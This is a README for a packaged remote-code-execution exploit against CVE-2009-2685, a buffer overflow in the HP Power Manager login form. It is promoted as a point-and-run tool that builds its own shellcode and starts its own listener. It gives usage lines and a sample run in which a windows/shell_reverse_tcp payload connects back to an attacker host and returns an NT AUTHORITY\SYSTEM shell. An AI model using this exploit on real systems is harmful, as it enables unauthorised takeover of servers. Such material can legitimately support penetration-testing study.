# CVE-2009-2685

Stack-based buffer overflow in the login form in the management web server in HP Power Manager allows remote attackers to execute arbitrary code via the Login variable.

## Summary

My modified version! Just point and run! No need to start listener or generate shellcode everything is handled in this PoC

## Usage

```sh
⬢  CVE_2009-2685_HP_Power_Manager_RCE  master ⦿ ./hpm_rce.py

 ██░ ██  ██▓███   ███▄ ▄███▓ ██▀███   ▄████▄  ▓█████
▓██░ ██▒▓██░  ██▒▓██▒▀█▀ ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
▒██▀▀██░▓██░ ██▓▒▓██    ▓██░▓██ ░▄█ ▒▒▓█    ▄ ▒███
░▓█ ░██ ▒██▄█▓▒ ▒▒██    ▒██ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
░▓█▒░██▓▒██▒ ░  ░▒██▒   ░██▒░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
 ▒ ░░▒░▒▒▓▒░ ░  ░░ ▒░   ░  ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
 ▒ ░▒░ ░░▒ ░     ░  ░      ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░
 ░  ░░ ░░░       ░      ░     ░░   ░ ░           ░
 ░  ░  ░                ░      ░     ░ ░         ░  ░
                                     ░
[nighter@nighter.se] - CVE-2009-2685

Usage: ./hpm_rce.py <HOST>:<PORT> <LHOST> <LPORT>
EXAMPLE: ./hpm_rce.py '10.10.10.70' 10.10.14.24 1337

```

## Exploit

```sh
$ ./hpm_rce.py 10.11.1.xxx 10.11.0.xxx 4444
[+] Start listener
[+] Build shellcode
PAYLOAD => windows/shell_reverse_tcp
LHOST => 10.11.0.xxx
LPORT => 4444
[*] Started reverse TCP handler on 10.11.0.xxx:4444
[+] Exploit
[*] Command shell session 1 opened (10.11.0.xxx:4444 -> 10.11.1.xxx:49166) at 2019-02-25 08:57:28 -0500

C:\Windows\system32>whoami
whoami
nt authority\system
```